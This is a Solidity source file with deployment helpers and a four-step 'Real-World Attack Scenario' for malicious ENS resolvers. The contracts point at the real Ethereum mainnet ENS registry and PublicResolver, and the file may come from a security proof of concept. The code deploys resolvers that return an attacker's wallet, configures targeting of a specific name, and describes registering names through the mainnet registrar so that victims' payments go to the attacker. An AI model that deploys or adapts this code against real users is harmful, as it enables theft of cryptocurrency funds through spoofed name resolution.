// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./MaliciousResolver.sol";
import "./MaliciousResolverAdvanced.sol";

/**
 * @title Deployment Examples
 * @notice Examples of how to deploy the malicious resolvers with real mainnet addresses
 */
contract DeploymentExamples {
    // Mainnet addresses
    address constant MAINNET_ENS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address constant MAINNET_PUBLIC_RESOLVER = 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41;
    
    /**
     * @notice Example: Deploy basic MaliciousResolver with mainnet addresses
     * @param attackerAddress The address to return instead of correct addresses
     * @return The deployed malicious resolver address
     */
    function deployBasicMaliciousResolver(address attackerAddress) external returns (address) {
        // Deploy with mainnet addresses (pass address(0) to use defaults)
        MaliciousResolver resolver = new MaliciousResolver(
            attackerAddress,
            address(0), // Use mainnet ENS
            address(0)  // Use mainnet PublicResolver
        );
        
        // Or explicitly pass mainnet addresses:
        // MaliciousResolver resolver = new MaliciousResolver(
        //     attackerAddress,
        //     MAINNET_ENS,
        //     MAINNET_PUBLIC_RESOLVER
        // );
        
        return address(resolver);
    }
    
    /**
     * @notice Example: Deploy advanced MaliciousResolver with mainnet addresses
     * @param attackerAddress The default address to return instead of correct addresses
     * @return The deployed malicious resolver address
     */
    function deployAdvancedMaliciousResolver(address attackerAddress) external returns (address) {
        // Deploy with mainnet addresses (pass address(0) to use defaults)
        MaliciousResolverAdvanced resolver = new MaliciousResolverAdvanced(
            attackerAddress,
            address(0), // Use mainnet ENS
            address(0)  // Use mainnet PublicResolver
        );
        
        // Or explicitly pass mainnet addresses:
        // MaliciousResolverAdvanced resolver = new MaliciousResolverAdvanced(
        //     attackerAddress,
        //     MAINNET_ENS,
        //     MAINNET_PUBLIC_RESOLVER
        // );
        
        return address(resolver);
    }
    
    /**
     * @notice Example: Deploy and configure advanced resolver for selective targeting
     * @param attackerAddress The default address to return
     * @param targetNamehash The namehash of the name to target
     * @param specificAttackerAddress The specific address to return for the target
     * @return The deployed malicious resolver address
     */
    function deployAndConfigureAdvancedResolver(
        address attackerAddress,
        bytes32 targetNamehash,
        address specificAttackerAddress
    ) external returns (address) {
        // Deploy with mainnet addresses
        MaliciousResolverAdvanced resolver = new MaliciousResolverAdvanced(
            attackerAddress,
            address(0), // Use mainnet ENS
            address(0)  // Use mainnet PublicResolver
        );
        
        // Configure selective targeting
        resolver.setAttackMode(false); // Only attack targeted names
        resolver.targetNode(targetNamehash, specificAttackerAddress);
        
        return address(resolver);
    }
}

/**
 * @title Real-World Attack Scenario
 * @notice Demonstrates how an attacker would deploy and use the malicious resolver
 */
contract AttackScenario {
    // Mainnet addresses
    address constant MAINNET_ENS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address constant MAINNET_PUBLIC_RESOLVER = 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41;
    
    /**
     * @notice Step 1: Attacker deploys malicious resolver
     * @param attackerWallet The attacker's wallet address (where funds will be sent)
     * @return maliciousResolver The deployed malicious resolver address
     */
    function step1_DeployMaliciousResolver(address attackerWallet) external returns (address maliciousResolver) {
        // Deploy with mainnet PublicResolver address (pass address(0) to use defaults)
        MaliciousResolver resolver = new MaliciousResolver(
            attackerWallet,
            address(0), // Use mainnet ENS: 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e
            address(0)  // Use mainnet PublicResolver: 0x4976fb03C32e5B8cfe2b6cCB31c09Ba78EBaBa41
        );
        return address(resolver);
    }
    
    /**
     * @notice Step 2: Attacker registers name with malicious resolver
     * @dev This would be done via ETHRegistrarController.register()
     *      with registration.resolver = maliciousResolver address
     */
    function step2_RegisterNameWithMaliciousResolver(
        address maliciousResolver,
        string memory nameToRegister
    ) external {
        // In real attack, this would call:
        // ETHRegistrarController(0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547).register({
        //     label: nameToRegister,
        //     owner: attacker,
        //     resolver: maliciousResolver, // ⚠️ Malicious resolver
        //     data: [/* resolver data */],
        //     reverseRecord: 1, // Set reverse record too
        //     ...
        // });
    }
    
    /**
     * @notice Step 3: Victim queries name, gets malicious address
     * @dev When victim calls maliciousResolver.addr(namehash), they get attacker's address
     */
    function step3_VictimQueriesName(address maliciousResolver, bytes32 namehash) external view returns (address) {
        // Victim thinks they're getting the correct address
        // But malicious resolver returns attacker's address instead
        return IAddrResolver(maliciousResolver).addr(namehash);
    }
    
    /**
     * @notice Step 4: Victim sends funds to malicious address
     * @dev Funds go to attacker instead of intended recipient
     */
    function step4_VictimSendsFunds(address maliciousAddress) external payable {
        // Victim sends funds thinking it's the correct address
        // But it's actually the attacker's address
        payable(maliciousAddress).transfer(msg.value);
    }
}

interface IAddrResolver {
    function addr(bytes32 node) external view returns (address payable);
}
